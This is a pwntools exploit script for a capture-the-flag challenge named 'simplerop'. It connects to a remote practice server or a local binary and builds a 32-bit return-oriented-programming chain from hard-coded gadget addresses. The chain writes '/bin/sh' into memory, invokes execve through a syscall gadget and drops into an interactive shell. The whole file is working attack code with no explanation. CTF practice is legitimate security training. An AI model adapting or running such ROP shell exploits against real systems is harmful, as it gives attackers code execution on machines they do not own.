#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or "simplerop")

host = args.HOST or "node4.buuoj.cn"
port = int(args.PORT or 26790)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


gdbscript = """
b *main+75
continue
""".format(
    **locals()
)

pop_edx = 0x0806E82A
pop_eax = 0x080BAE06
pop_edx_ecx_ebx = 0x0806E850
mov_edx_eax = 0x0809A15D
syscall = 0x080493E1
_data = 0x080EA060

p = b"\x90" * 32
p += p32(pop_edx)
p += p32(_data)
p += p32(pop_eax)
p += b"/bin"
p += p32(mov_edx_eax)

p += p32(pop_edx)
p += p32(_data + 0x4)
p += p32(pop_eax)
p += b"/sh\x00"
p += p32(mov_edx_eax)

p += p32(pop_eax)
p += p32(0xB)
p += p32(pop_edx_ecx_ebx)
p += p32(0x0)
p += p32(0x0)
p += p32(_data)
p += p32(syscall)

info(f"[size]: {len(p)}")
io = start()
io.clean()
io.sendline(p)
io.interactive()
